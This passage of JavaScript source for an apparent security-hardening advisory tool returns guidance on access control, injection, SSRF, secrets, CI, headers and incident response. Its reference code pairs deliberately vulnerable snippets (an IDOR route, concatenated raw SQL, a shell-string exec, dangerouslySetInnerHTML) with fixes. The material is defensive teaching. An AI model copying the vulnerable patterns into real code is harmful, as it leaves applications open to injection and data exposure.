    ? [briefsByFocus.broken_access_control[0], briefsByFocus.broken_access_control[1], briefsByFocus.injection_and_xss[0], briefsByFocus.injection_and_xss[1], briefsByFocus.ssrf_and_request_forgery[0], briefsByFocus.auth_session_failures[0], briefsByFocus.auth_session_failures[2], briefsByFocus.security_misconfiguration[0], briefsByFocus.security_misconfiguration[1], briefsByFocus.security_misconfiguration[2]]
    : briefsByFocus[focus];

  const codeByFocus = {
    broken_access_control: [
      '// ── VULNERABLE: the AI-codegen classic — auth checked, ownership forgotten ──',
      'app.get("/api/invoices/:id", requireAuth, async (req, res) => {',
      '  const invoice = await db.invoice.findUnique({ where: { id: req.params.id } });',
      '  res.json(invoice); // any logged-in user reads ANY invoice',
      '});',
      '',
      '// ── FIXED: fetch-then-verify ownership, 404 on mismatch ──',
      'app.get("/api/invoices/:id", requireAuth, async (req, res) => {',
      '  const invoice = await db.invoice.findUnique({ where: { id: req.params.id } });',
      '  if (!invoice || invoice.orgId !== req.session.orgId) {',
      '    return res.status(404).json({ error: "Not found" }); // 404, not 403: do not confirm existence',
      '  }',
      '  res.json(invoice);',
      '});',
      '',
      '// ── BETTER: make the safe query the only easy query ──',
      'async function findOwned(model, id, orgId) {',
      '  return db[model].findFirst({ where: { id, orgId } }); // scope IN the query',
      '}',
      '',
      '// ── Deny-by-default route permissions ──',
      'const PERMS = { "GET /api/admin/users": "admin:read", "POST /api/refunds": "billing:write" };',
      'function authorize(req, res, next) {',
      '  const needed = PERMS[req.method + " " + req.route.path];',
      '  if (!needed) return res.status(403).json({ error: "No permission mapping" }); // fail CLOSED',
      '  if (!req.session.perms.includes(needed)) return res.status(403).json({ error: "Forbidden" });',
      '  next();',
      '}',
      '',
      '// ── Mass assignment: allowlist the writable fields ──',
      'const UpdateProfile = z.object({ name: z.string().max(80), bio: z.string().max(500) }).strict();',
      'app.patch("/api/users/me", requireAuth, (req, res) => {',
      '  const data = UpdateProfile.parse(req.body);   // role/email/id cannot pass',
      '  return db.user.update({ where: { id: req.session.userId }, data });',
      '});'
    ],
    injection_and_xss: [
      '// ── VULNERABLE: raw query + concat (grep your codebase for this shape) ──',
      'const rows = await db.$queryRawUnsafe(',
      '  "SELECT * FROM users WHERE email = \u0027" + email + "\u0027"',
      ');',
      '',
      '// ── FIXED: parameterized even in raw escape hatches ──',
      'const rows = await db.$queryRaw`SELECT * FROM users WHERE email = ${email}`;',
      '// (tagged template = driver-level parameters, not string interpolation)',
      '',
      '// ── Command injection: never build shell strings ──',
      '// VULNERABLE: exec("ffmpeg -i " + userFile + " out.mp4")',
      'import { execFile } from "node:child_process";',
      'execFile("ffmpeg", ["-i", userFile, "out.mp4"], { timeout: 60_000 }, cb); // args array, no shell',
      '',
      '// ── XSS: sanitize user HTML once, at the boundary, with an allowlist ──',
      'import sanitizeHtml from "sanitize-html";',
      'const safeBio = sanitizeHtml(userBio, {',
      '  allowedTags: ["b", "i", "em", "strong", "a", "p", "ul", "li"],',
      '  allowedAttributes: { a: ["href"] },',
      '  allowedSchemes: ["https", "mailto"], // kills javascript: URLs',
      '});',
      '',
      '// React: render as text by default — the audit greps for the bypass:',
      '// <div dangerouslySetInnerHTML={{ __html: userContent }} />  ← every instance justified or removed'
    ],
    ssrf_and_request_forgery: [
      '// ── SSRF guard: scheme allowlist + private-range blocking + redirect re-checks ──',
      'import { lookup } from "node:dns/promises";',
      'import ipaddr from "ipaddr.js";',
      '',
      'async function assertSafeUrl(raw) {',
      '  const url = new URL(raw);',
      '  if (url.protocol !== "https:") throw new Error("https only");',
      '  const { address } = await lookup(url.hostname);',
      '  const ip = ipaddr.parse(address);',
      '  const range = ip.range(); // "private" | "loopback" | "linkLocal" | "uniqueLocal" | ...',
      '  if (range !== "unicast") throw new Error("Blocked range: " + range);',
      '  return { url, pinnedIp: address }; // connect to THIS ip (TOCTOU defense)',
      '}',
      '',
      'async function safeFetch(raw, redirectsLeft = 3) {',
      '  const { url } = await assertSafeUrl(raw);',
      '  const res = await fetch(url, { redirect: "manual", signal: AbortSignal.timeout(10_000) });',
      '  if ([301, 302, 307, 308].includes(res.status)) {',
      '    if (!redirectsLeft) throw new Error("Too many redirects");',
      '    return safeFetch(res.headers.get("location"), redirectsLeft - 1); // re-validate EVERY hop',
      '  }',
      '  return res;',
      '}',
      '',
      '// ── Webhook verification (inbound): signature or it did not happen ──',
      'app.post("/webhooks/stripe", express.raw({ type: "application/json" }), (req, res) => {',
      '  let event;',
      '  try {',
      '    event = stripe.webhooks.constructEvent(req.body, req.headers["stripe-signature"], WH_SECRET);',
      '  } catch { return res.status(400).send("bad signature"); }',
      '  // idempotency: processed_events table keyed by event.id — replays are attacks too',
      '});'
    ],
    auth_session_failures: [
      '// ── Password storage: argon2id + transparent legacy migration ──',
      'import argon2 from "argon2";',
      'const hash = await argon2.hash(password, { type: argon2.argon2id, memoryCost: 19456, timeCost: 2 });',
      '',
      'async function verifyAndUpgrade(user, password) {',
      '  if (user.hash.startsWith("$argon2id$")) return argon2.verify(user.hash, password);',
      '  const ok = legacyVerify(user.hash, password);          // old bcrypt/sha path',
      '  if (ok) await saveHash(user.id, await argon2.hash(password, { type: argon2.argon2id }));',
      '  return ok;                                              // rehash-on-login migration',
      '}',
      '',
      '// ── Reset tokens: random, hashed at rest, single-use, short-lived ──',
      'import { randomBytes, createHash } from "node:crypto";',
      'const token = randomBytes(32).toString("base64url");          // goes in the email',
      'const tokenHash = createHash("sha256").update(token).digest("hex"); // goes in the DB',
      'await db.reset.create({ data: { userId, tokenHash, expiresAt: inMinutes(30) } });',
      '// on use: lookup by hash, check expiry, DELETE the row, rotate session, invalidate others',
      '',
      '// ── Refresh rotation with reuse detection ──',
      'async function refresh(oldToken) {',
      '  const row = await db.refresh.findUnique({ where: { tokenHash: h(oldToken) } });',
      '  if (!row) throw new AuthError("invalid");',
      '  if (row.usedAt) {                                       // REUSE = theft signal',
      '    await db.refresh.deleteMany({ where: { familyId: row.familyId } }); // kill family',
      '    throw new AuthError("reuse-detected");',
      '  }',
      '  await db.refresh.update({ where: { id: row.id }, data: { usedAt: new Date() } });',
      '  return issuePair(row.userId, row.familyId);             // new access + refresh',
      '}'
    ],
    security_misconfiguration: [
      '# ── Prod misconfiguration gate: run in CI before every deploy ──',
      '#!/usr/bin/env bash',
      'set -euo pipefail',
      '',
      '# 1. Debug flags',
      'grep -RIn "DEBUG\\s*=\\s*True\\|NODE_ENV.*development" deploy/ && exit 1',
      '',
      '# 2. Served dotfiles (run against staging URL)',
      'for p in .env .git/config .env.local backup.sql; do',
      '  code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/$p")',
      '  [ "$code" = "404" ] || { echo "SERVED: /$p ($code)"; exit 1; }',
      'done',
      '',
      '# 3. Bucket public-access (AWS)',
      'aws s3api get-public-access-block --bucket "$BUCKET" \\',
      '  | grep -q "\\"BlockPublicAcls\\": true" || { echo "bucket not locked"; exit 1; }',
      '',
      '# 4. GraphQL introspection in prod',
      'curl -s "$BASE_URL/graphql" -H "content-type: application/json" \\',
      '  -d "{\\"query\\":\\"{__schema{types{name}}}\\"}" | grep -q __schema && { echo "introspection open"; exit 1; }',
      '',
      '# 5. Dependency criticals',
      'npm audit --audit-level=critical || exit 1',
      '',
      'echo "misconfig gate: PASS"'
    ]
  };

  const referenceCode = (focus === 'full_top10_sweep'
    ? [...codeByFocus.broken_access_control, '', ...codeByFocus.ssrf_and_request_forgery]
    : codeByFocus[focus]).join('\n');

  const frameworkNotes = {
    express_node: 'EXPRESS NOTES: nothing is on by default — helmet() for headers, express-rate-limit on auth routes, zod at every body/query/param ingress, and the deny-by-default authorize() wrapper above mounted on the router (not per-route discipline). The middleware-ordering trap: auth middleware after body parsing but before handlers, and 404/error handlers LAST or they leak. express.raw() specifically on webhook routes BEFORE json parsing or signatures never verify.',
    nextjs: 'NEXT.JS NOTES: the trap is believing middleware.ts is your security boundary — middleware is bypassable (direct route hits, cache weirdness) so EVERY server action and route handler re-checks auth/authz itself. Server Actions are public endpoints (attackers call them without your forms — validate + authorize inside each one). Secrets only in non-NEXT_PUBLIC_ env vars; NEXT_PUBLIC_ anything ships to every browser. API routes + getServerSideProps both need object-level checks — the component tree hiding a link is UI, not authorization.',
    django_or_fastapi: 'DJANGO/FASTAPI NOTES: Django — the framework is your ally; findings cluster in the bypasses: raw(), extra(), mark_safe, @csrf_exempt, DEBUG=True in prod; use django-ratelimit + SECURE_* settings block, and get_object_or_404(Model, pk=pk, owner=request.user) as the IDOR-proof fetch idiom. FastAPI — Pydantic validates shape, not authority: every router needs Depends(require_user) and object-level dependencies (Depends(owned_invoice)); never yaml.load/pickle user data; uvicorn behind a real proxy for header sanity.',
    laravel_php: 'LARAVEL NOTES: Eloquent parameterizes by default — audit DB::raw() and whereRaw() concat; Blade {{ }} escapes — audit {!! !!}; mass assignment guarded by $fillable (never $guarded = [] on user-facing models); Policies + authorize() in controllers for object-level checks (the findOrFail($id) without a policy check is the Laravel IDOR idiom); CSRF middleware stays on (the VerifyCsrfToken $except list is a finding generator); config:cache + APP_DEBUG=false in prod.'
  };

  return {
    status: 'success',
    vulnerability_briefs: briefs,
    reference_code: referenceCode,
    framework_notes: frameworkNotes[framework],
    ai_codegen_warnings: 'PATTERNS AI ASSISTANTS GET WRONG (review generated code for exactly these): (1) CRUD handlers that check login but never ownership — the #1 generated-IDOR factory; (2) req.body spread straight into ORM updates (mass assignment); (3) raw SQL with template interpolation when asked for "a custom query"; (4) example secrets ("sk_test_...", hardcoded JWT secrets) that survive into commits; (5) CORS "fixed" with origin: "*" + credentials; (6) password hashing with crypto.createHash("sha256") because it looked like the stdlib way; (7) fetch() of user URLs with zero SSRF guards when asked for an importer/webhook; (8) catch blocks that res.send(err.stack). Treat AI output like a fast junior: brilliant velocity, zero security instincts — this tool is the review pass.',
    testing_approach: 'PROVE THE FIXES HOLD: (1) AUTHZ REGRESSION SUITE — for every sensitive endpoint, a test logging in as user B and requesting user A\u2019s resource expecting 404/403; this suite is the cheapest pentest you will ever own and it runs on every PR. (2) ESCAPE-HATCH LINT — CI greps (dangerouslySetInnerHTML, $queryRawUnsafe, mark_safe, exec() with variables) that fail the build without a // security-reviewed: comment. (3) DEPENDENCY + SECRET GATES — npm audit/pip-audit criticals and gitleaks on every PR. (4) DAST-LITE — ZAP baseline scan against staging weekly (free, automated, catches header/cookie/obvious-injection regressions). (5) ANNUAL HUMAN PASS — a real pentest once the product has customers; scope it to the money/PII flows first (prepare_incident_response_audit covers the prep that halves the bill).'
  };
}

/* ─────────────────────────── TOOL 3: SECRETS & SUPPLY CHAIN ─────────────────────────── */

function implementSecrets(args) {
  const environment = args.environment || 'cloud_production';
  const priority = args.priority || 'prevention_setup';

  const envPlans = {
    cloud_production: 'CLOUD PRODUCTION: secrets live in the platform secret store (AWS Secrets Manager/SSM, GCP Secret Manager, Cloudflare/Vercel/Fly secret bindings) and reach code ONLY as injected env/bindings at deploy — never in images, never in code, never in dashboards-screenshotted-to-Slack. Rotation reality: automate DB credentials where the platform supports it; for third-party API keys (Stripe, OpenAI) schedule quarterly manual rotation with a two-key overlap window (new key live → deploy → revoke old) so rotation is boring, not a maintenance window. One secret per purpose (the shared "MASTER_API_KEY" means rotating anything rotates everything). Access: humans read prod secrets through break-glass audited paths only — day-to-day debugging uses staging.',
    ci_cd_pipeline: 'CI/CD PIPELINE: the pipeline is a production system with push access to everything — treat it that way. Rules: (1) OIDC federation over stored cloud keys (GitHub Actions/GitLab issue short-lived tokens per run — the stored AWS_SECRET_ACCESS_KEY era is over; a leaked OIDC token dies in minutes); (2) environment-scoped secrets with protection rules (prod secrets only on protected branches with required reviewers — a malicious PR must not be able to exfiltrate them); (3) third-party actions PINNED BY COMMIT SHA (tags are mutable — the tj-actions compromise exfiltrated secrets from thousands of repos via a moved tag); (4) secrets never in build args/layers (docker history shows them forever); (5) fork PRs get zero secrets (default, but verify pull_request_target usage — the classic leak vector).',
    local_dev_team: 'LOCAL DEV TEAM: the goal is making the secure path the lazy path: .env files gitignored from repo creation + .env.example with fake values committed; real dev secrets distributed via 1Password/Doppler/Infisical (shared vaults with offboarding built in — the Slack-DM distribution model has no revocation story); pre-commit gitleaks hook in the repo template so leaks die before the commit exists; dev/staging keys are DIFFERENT keys from prod (a laptop theft must not be a prod incident); and the rule that test scripts never use prod credentials "just to check something" — that is how prod data ends up in a laptop /tmp.',
    kubernetes: 'KUBERNETES: native Secrets are base64-encoded etcd rows — enable etcd encryption at rest + RBAC that actually restricts secret reads (the default ClusterRole sprawl means every service account reads everything). Better: External Secrets Operator syncing from a real secret manager (single source of truth, rotation flows through), or sealed-secrets for GitOps shops. Mount as files over env vars where possible (env leaks into crash dumps, /proc, and kubectl describe). Per-namespace isolation with NetworkPolicies, image pull from your registry only, and admission control (no :latest, no privileged, no hostPath) via Kyverno/Gatekeeper as the paved road.'
  };

  const priorityNote = {
    leaked_secret_emergency: 'EMERGENCY MODE: execute the leaked_secret_runbook below top-to-bottom NOW — rotation first, forensics second, git-history cosmetics last. The key fact: assume exploitation at T+0 — scanners find GitHub-pushed AWS keys in under 60 seconds (honeytoken studies confirm single-digit minutes); the window for "maybe nobody saw it" closed before you finished reading the alert.',
    prevention_setup: 'PREVENTION MODE: ship the three gates this week — (1) pre-commit gitleaks hook (template repo so every new project inherits it), (2) CI secret scan on every PR (gitleaks action, fails the build), (3) GitHub push protection ON org-wide (blocks the push itself — the only gate that prevents rather than detects). Then the secrets architecture below.',
    dependency_security: 'DEPENDENCY MODE: the supply_chain_defenses list below is your work queue — lockfile discipline, audit gates, install-script caution, and update cadence. Modern reality: attackers publish malicious packages more often than they exploit vulnerable ones; your defenses must cover both.',
    full_hardening: 'FULL HARDENING: run all four tracks in order — leak gates (week 1), secrets architecture (week 2-3), supply chain defenses (week 3-4), CI hardening (month 2). Each section below is one track.'
  }[priority];

  return {
    status: 'success',
    mode_note: priorityNote,
    secrets_management_plan: envPlans[environment],
    leaked_secret_runbook: [
      '1. ROTATE FIRST, INVESTIGATE SECOND (minute 0-15): generate the new credential, deploy it, revoke the old one. Not "after standup". Scanners exploit GitHub-pushed cloud keys in under a minute — rotation is the only step with a deadline measured in minutes.',
      '2. SCOPE THE BLAST RADIUS (hour 1): what could this key DO? Read-only analytics key ≠ AWS admin key. Check provider audit logs (AWS CloudTrail, Stripe logs, GitHub audit log) for usage by unfamiliar IPs/user agents since the leak timestamp — the leak time is the git commit time, not the discovery time.',
      '3. HUNT SIBLINGS (hour 1-2): one leaked secret means the practice that leaked it leaked others — gitleaks on the FULL history of the repo and adjacent repos; rotate everything found, not just the reported one.',
      '4. CLEAN HISTORY — WITH HONEST EXPECTATIONS (day 1): git filter-repo/BFG + force-push removes it from YOUR repo, but forks, clones, PR diffs, and scraper archives already have it — history cleaning is hygiene for future scanners, NOT un-leaking. The rotation in step 1 is the actual fix; never let history-scrubbing substitute for it.',
      '5. CLOSE THE HOLE (week 1): why did it reach git? Missing pre-commit hook, secret hardcoded for a test, .env committed? Fix the system (push protection org-wide, hook in the template, the test refactored) so this class dies, not just the instance.',
      '6. WRITE IT DOWN (week 1): 5-line postmortem — what leaked, exposure window, evidence of use y/n, blast radius, systemic fix. The disclosure question (customers/regulators) depends on evidence of access to THEIR data — check the audit logs before deciding, with counsel if PII was reachable.'
    ],
    supply_chain_defenses: [
      { defense: 'Lockfile discipline', detail: 'Committed lockfiles + frozen installs in CI (npm ci / pip install --require-hashes / pnpm --frozen-lockfile) — the build installs EXACTLY what was reviewed, and a hijacked transitive version cannot slide in silently. Any PR that touches the lockfile without touching package.json is a red flag worth a close look.' },
      { defense: 'Install-script caution', detail: 'npm postinstall scripts run arbitrary code at install time — the primary payload vehicle in real npm attacks. Mitigate: pnpm (scripts off by default with an allowlist) or npm config ignore-scripts=true + explicit allowlist for the few that need it (esbuild, sharp). CI installs with scripts disabled wherever the build survives it.' },
      { defense: 'Typosquat & slopsquat hygiene', detail: 'Attackers register lodahs/reqeusts and — new in the AI era — packages matching names LLMs hallucinate (slopsquatting). Rule: never install from memory or from AI output without checking the registry page (weekly downloads, repo link, publish history). A package published last week with 400 downloads named like a famous one is a no.' },
      { defense: 'Audit gating with judgment', detail: 'npm audit / pip-audit / osv-scanner in CI: CRITICAL with known exploit = build fails; HIGH = fix within a week; the long MODERATE tail = scheduled, not panicked (alert fatigue is how real criticals get ignored). Pair with Dependabot/Renovate grouped weekly PRs so updating is routine, not an event.' },
      { defense: 'Update cooldown', detail: 'Compromised versions are typically caught within 24-72h of publication — configure Renovate minimumReleaseAge (3-7 days) so your bots do not race to install a hijacked release the hour it ships. Security patches override the cooldown manually.' },
      { defense: 'Provenance & integrity', detail: 'Prefer packages with npm provenance/Sigstore attestation (proves the artifact came from the stated repo CI); for your OWN releases, publish with --provenance so downstreams can verify you. SBOM generation (syft) at build time makes the "are we affected by X?" question a 30-second query instead of an archaeology sprint.' }
    ],
    ci_hardening_config: [
      '# .github/workflows/deploy.yml — hardened skeleton',
      'name: deploy',
      'on:',
      '  push:',
      '    branches: [main]',
      '',
      'permissions: {}                      # top-level: NOTHING by default',
      '',
      'jobs:',
      '  deploy:',
      '    runs-on: ubuntu-latest',
      '    environment: production          # protected env: required reviewers gate the secrets',
      '    permissions:',
      '      id-token: write                # OIDC — no stored cloud keys',
      '      contents: read',
      '    steps:',
      '      # Pin third-party actions by COMMIT SHA (tags are mutable = attack vector)',
      '      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8   # v5.0.0',
      '',
      '      - uses: aws-actions/configure-aws-credentials@36e60e0ccee9a6d9b4b9d6aa90a0a9e2662b0e3b',
      '        with:',
      '          role-to-assume: arn:aws:iam::123456789:role/deploy-this-repo-only',
      '          aws-region: us-east-1      # short-lived, repo-scoped, auto-expiring',
      '',
      '      - name: Secret scan (fail fast)',
      '        uses: gitleaks/gitleaks-action@44c470ffc35caa8b1eb3e8012ca53c2f9bea4eb5',
      '',
      '      - name: Install with frozen lockfile, no scripts',
      '        run: npm ci --ignore-scripts',
      '',
      '      - name: Audit gate',
      '        run: npm audit --audit-level=critical',
      '',
      '      - run: npm run build && npm run deploy',
      '',
      '# Org-wide: push protection ON, fork PRs get no secrets,',
      '# pull_request_target audited everywhere it appears.'
    ].join('\n'),
    scanning_stack: 'THE SCANNING STACK (all free tiers): (1) gitleaks — pre-commit hook + CI action + a monthly FULL-HISTORY scan across all repos (new rules catch old leaks); (2) GitHub Secret Scanning + Push Protection — org-wide on; it blocks pushes containing recognizable provider tokens and providers auto-revoke many leaked formats; (3) osv-scanner or npm audit/pip-audit in CI per the gating policy; (4) Renovate with grouped weekly updates + 3-7 day minimumReleaseAge cooldown; (5) a canary secret (honeytoken from canarytokens.org) placed in your .env.example and private repos — if it ever fires, your "private" perimeter is not; it is the cheapest intrusion detection that exists.'
  };
}

/* ─────────────────────────── TOOL 4: HEADERS & CSP ─────────────────────────── */

function configureHeaders(args) {
  const appType = args.app_type || 'ssr_nextjs_astro';
  const strictness = args.csp_strictness || 'report_only_first';

  const cspByStrictness = {
    report_only_first: 'REPORT-ONLY ROLLOUT (the only CSP rollout that survives contact with production): ship Content-Security-Policy-Report-Only with your target policy + report-to endpoint, run 1-2 weeks of real traffic, and let violation reports write your allowlist — you WILL discover scripts you forgot you had (analytics snippets, support widgets, that A/B tool marketing added in 2024). Triage reports: legitimate sources get added, garbage (extensions cause phantom violations — filter moz-extension/chrome-extension noise) gets ignored, and actual inline-script debt gets refactored to nonces. Only then flip to enforcing. Teams that skip report-only ship CSP twice: once breaking production, once correctly.',
    strict_nonce_based: 'STRICT NONCE-BASED CSP (the 2026 gold standard): script-src "nonce-{random}" "strict-dynamic" — every server response generates a fresh nonce, templates stamp it on legitimate script tags, and strict-dynamic lets those scripts load their own chunks (how modern bundlers survive strict CSP). This kills the allowlist-maintenance treadmill AND the classic allowlist bypasses (hosting payloads on allowed CDNs, JSONP gadgets on whitelisted domains). Requires SSR or edge injection (the nonce must be per-response — a static nonce is no nonce); static-only sites use hashes instead (CSP hash-source per inline script).',
    legacy_compatible: 'LEGACY-COMPATIBLE CSP: when third-party tags you cannot remove (ad tech, old widgets) make strict CSP impossible today, layer it: (1) enforce the non-script wins immediately — frame-ancestors, object-src "none", base-uri "self", form-action "self" break clickjacking and injection-adjacent tricks with zero compat risk; (2) script-src as a tight allowlist WITHOUT unsafe-inline where possible — if a vendor demands unsafe-inline, isolate that page under its own weaker policy (per-route CSP) instead of weakening the whole site; (3) run the strict nonce policy in Report-Only in parallel, so you know exactly which vendors block your upgrade and can lobby/replace them with data.'
  };

  const appNotes = {
    spa_react_vue: 'SPA NOTES: the CSP must be delivered as an HTTP HEADER from the host/CDN (meta tags cannot set frame-ancestors and arrive too late); the index.html shell typically needs zero inline scripts (CRA/Vite builds are external-script clean — verify) making strict CSP unusually easy; connect-src is your main allowlist (API origin, websocket origin, analytics ingest); and remember the SPA trap: authorization lives in the API, not the router — CSP hardens the browser, it does not replace object-level checks.',
    ssr_nextjs_astro: 'SSR NOTES: per-response nonces fit SSR naturally — Next.js: generate the nonce in middleware, pass via request headers, stamp on <Script> tags (the framework docs pattern); Astro/others: template the nonce into the layout. Framework inline hydration scripts need the nonce too — test with enforcement in staging CI (a Playwright run with CSP enforced catches the missed tag before prod). unsafe-eval: some dev tooling needs it — scope it to development builds ONLY, never ship it.',
    marketing_site: 'MARKETING-SITE NOTES: the tag-manager problem IS the CSP problem — GTM loading arbitrary marketing scripts is architecturally identical to an XSS. Options in order of preference: (1) server-side GTM (tags run server-side, browser loads one first-party script — best for CSP, privacy AND performance); (2) strict CSP with GTM nonce-propagated (GTM supports nonce-aware injection — configure it, do not abandon CSP); (3) documented allowlist with quarterly review and marketing sign-off, so scope creep is a decision, not drift.',
    api_only_service: 'API-ONLY NOTES: no HTML means a different header set — CSP collapses to default-src "none"; frame-ancestors "none" (defense in depth), X-Content-Type-Options: nosniff (critical where user content is served/reflected), no caching of authenticated responses (Cache-Control: no-store on anything personal), HSTS still mandatory, and CORS becomes your main browser-facing control (see cors_configuration). The classic API mistake is reflecting user input in JSON error messages served as text/html — content-type discipline + nosniff closes the sniffing XSS.'
  };

  return {
    status: 'success',
    headers_config_code: [
      '// Next.js (next.config.js) — transferable to any server/CDN as raw headers',
      'const securityHeaders = [',
      '  // HSTS: force HTTPS for 2 years, include subdomains (submit to preload list when stable)',
      '  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },',
      '',
      '  // Clickjacking: CSP frame-ancestors is the modern control (X-Frame-Options as legacy echo)',
      '  { key: "X-Frame-Options", value: "DENY" },',
      '',
      '  // MIME sniffing off — uploads served as declared types only',
      '  { key: "X-Content-Type-Options", value: "nosniff" },',
      '',
      '  // Referrer: full URL to self, origin-only cross-site (no token/path leakage)',
      '  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },',
      '',
      '  // Kill powerful APIs you do not use (prompt-abuse + compromised-script damage control)',
      '  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=(), payment=()" },',
      '',
      '  // Process isolation (Spectre-class) — test before enabling if you embed cross-origin iframes',
      '  { key: "Cross-Origin-Opener-Policy", value: "same-origin" },',
      '];',
      '',
      '// Strict nonce-based CSP (middleware.ts) — per-response nonce',
      'import { NextResponse } from "next/server";',
      '',
      'export function middleware(req) {',
      '  const nonce = Buffer.from(crypto.getRandomValues(new Uint8Array(16))).toString("base64");',
      '  const csp = [',
      '    "default-src \u0027self\u0027",',
      '    "script-src \u0027nonce-" + nonce + "\u0027 \u0027strict-dynamic\u0027",',
      '    "style-src \u0027self\u0027 \u0027unsafe-inline\u0027",   // styles: pragmatic default; tighten later',
      '    "img-src \u0027self\u0027 data: https:",',
      '    "connect-src \u0027self\u0027 https://api.example.com",',
      '    "frame-ancestors \u0027none\u0027",',
      '    "object-src \u0027none\u0027",',
      '    "base-uri \u0027self\u0027",',
      '    "form-action \u0027self\u0027",',
      '    "report-to csp-endpoint",',
      '  ].join("; ");',
      '',
      '  const res = NextResponse.next({ request: { headers: new Headers({ "x-nonce": nonce }) } });',
      '  res.headers.set("Content-Security-Policy", csp);  // -Report-Only first!',
      '  return res;',
      '}'
    ].join('\n'),
    csp_strategy: cspByStrictness[strictness] + ' NON-NEGOTIABLE DIRECTIVES regardless of strictness: frame-ancestors (clickjacking), object-src "none" (Flash-era gadgets), base-uri "self" (base-tag hijacks of relative script URLs), form-action "self" (form-redirect exfiltration). These four never break anything modern and close real attacks — ship them today even if script-src takes a quarter.',
    cookie_security: 'COOKIE/SESSION HARDENING: session cookies = HttpOnly (JS cannot read — XSS cannot exfiltrate the session) + Secure (HTTPS only) + SameSite=Lax (CSRF default-defense; Strict for admin panels, None only for legitimate cross-site embeds and then WITH the CSRF token layer) + __Host- prefix (locks to exact host + path=/ + Secure — kills subdomain planting). Scope: no Domain attribute unless cross-subdomain sharing is a real requirement (every subdomain you share with is in your trust boundary — including the forgotten marketing microsite on a vulnerable CMS). Sessions server-side: rotate on login/elevation, idle + absolute expiry, and a "log out everywhere" that actually revokes (session store deletion, not just cookie clearing). Storage decision for SPAs: tokens in memory + HttpOnly refresh cookie beats localStorage (XSS reads localStorage trivially; it cannot read HttpOnly).',
    cors_configuration: 'CORS CORRECTLY (it is an allowlist, not a switch): exact-origin matching against a configured set — never reflect the incoming Origin, never wildcard with credentials (spec forbids it; frameworks "help" by reflecting, which is worse). Allow only the methods/headers actually used (wildcarding headers defeats preflight as a control). Vary: Origin on every CORS response (cache poisoning otherwise). Preflight cache (Access-Control-Max-Age: 7200) saves latency. And the conceptual check: CORS protects BROWSER users from cross-site reads — it does nothing against curl/server-side callers; authorization still does the real work. If your API is public-read anyway, permissive CORS on public GETs is fine — just never on credentialed routes.',
    rollout_plan: 'STAGED ROLLOUT (zero-breakage sequence): WEEK 1 — ship the static header set (HSTS without preload first, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, frame-ancestors) — these break nothing and close real holes; verify on securityheaders.com (aim A). WEEK 1-3 — CSP in Report-Only with a report endpoint (report-uri.com free tier or a 20-line worker); triage violations into allowlist/nonce/garbage buckets. WEEK 3-4 — flip CSP to enforcing with the cleaned policy; keep Report-Only running in parallel with the NEXT stricter candidate policy (continuous tightening loop). MONTH 2 — HSTS preload submission (after confirming all subdomains serve HTTPS forever — preload is near-irreversible), COOP/COEP if no cross-origin embeds broke in staging. GUARDRAIL: every tightening ships behind a staging Playwright run with enforcement on — the test suite catches the broken checkout before customers do.',
    app_type_notes: appNotes[appType]
  };
}

/* ─────────────────────────── TOOL 5: INCIDENT RESPONSE & AUDIT ─────────────────────────── */

function prepareIncidentResponse(args) {
  const ctx = args.org_context;
  const driver = args.driver || 'pentest_preparation';

  const playbooks = {
    soc2_type2_prep: 'SOC 2 TYPE II PLAYBOOK: Type II audits OPERATION over time (6-12 month window) — the strategy is boring consistency, not heroics. Sequence: (1) scope ruthlessly — Security TSC only for round one (adding Availability/Confidentiality later is easy; starting wide doubles cost); (2) compliance automation platform (Vanta/Drata/Secureframe class) pays for itself immediately — continuous evidence collection beats the screenshot-sprint death march; (3) the controls that actually move the needle and that auditors test hardest: MFA everywhere, offboarding within 24h WITH evidence (the #1 finding across the industry is the contractor from 2024 who still has access), access reviews quarterly with sign-off artifacts, change management = enforced PR review (your git history IS the evidence if branch protection is on), vendor review list, tested backups, and an IR plan with a tabletop run logged; (4) policies match reality — auditors interview staff against the prose; a beautiful policy nobody follows is a finding generator; (5) budget reality: automation platform + auditor ≈ $20-40k year one for a small org — priced into enterprise deal #1 that it unblocks.',
    pentest_preparation: 'PENTEST PREP PLAYBOOK (preparation halves the bill and doubles the value): (1) pre-clean the known junk — run the free scanners yourself first (ZAP baseline, npm audit, testssl.sh, securityheaders.com): every trivial finding the testers burn hours documenting is money you paid to learn what a robot already told you; (2) scope for value — the money/PII/auth flows and tenant isolation get the hours, not the marketing site; name your top-3 fears in the kickoff (testers prioritize openly stated fears); (3) choose gray-box — give authenticated test accounts (two per role, so cross-user authz gets tested) + API docs: black-box spends your budget on recon you could have handed over; (4) environment: staging with prod-parity + seeded data, testers allowlisted past the WAF (you are buying app testing, not WAF testing — note WAF-bypass as a separate finding class); (5) logistics ready day one: contacts, rules of engagement, a Slack channel for blockers (every blocked day is billed); (6) afterwards — fix criticals within the retest window (retest included in most contracts), and convert each finding class into a regression test so next year finds NEW things.',
    active_incident_now: 'ACTIVE INCIDENT PLAYBOOK — breathe, then: (1) SEVERITY CALL (5 min): data confirmed exfiltrated / money moving = SEV1 all-hands; suspicious-but-unconfirmed = SEV2 investigate-first (most "incidents" are SEV2 and half are false alarms — do not burn the org on every alert); (2) ROLES (minute 10): ONE incident commander (decides, delegates, is not also typing), one scribe (timeline doc from minute one — memory reconstructs badly and regulators/insurers ask for timelines), responders execute; (3) CONTAIN before eradicate: revoke the credential, isolate the box, disable the account, block the IP — stop the bleeding BEFORE understanding everything (but snapshot/preserve logs first where containment would destroy evidence); (4) INVESTIGATE from logs: entry point, lateral movement, what was touched — resist the urge to wipe-and-rebuild before answering "what did they access" (that answer drives every legal duty); (5) LEGAL CLOCK: confirmed personal-data access starts notification clocks (GDPR 72h to regulator) — counsel in the loop by hour 2 of any SEV1 with PII; cyber insurance ALSO wants early notice (late notice jeopardizes coverage); (6) COMMS: one voice, facts only, no speculation ("we are investigating unusual activity affecting X; we will update by TIME") — overpromising in hour 3 haunts you in day 3; (7) AFTER: blameless postmortem within a week, fixes for the CLASS, and the detection that would have caught it in minute 5 instead of day 5.',
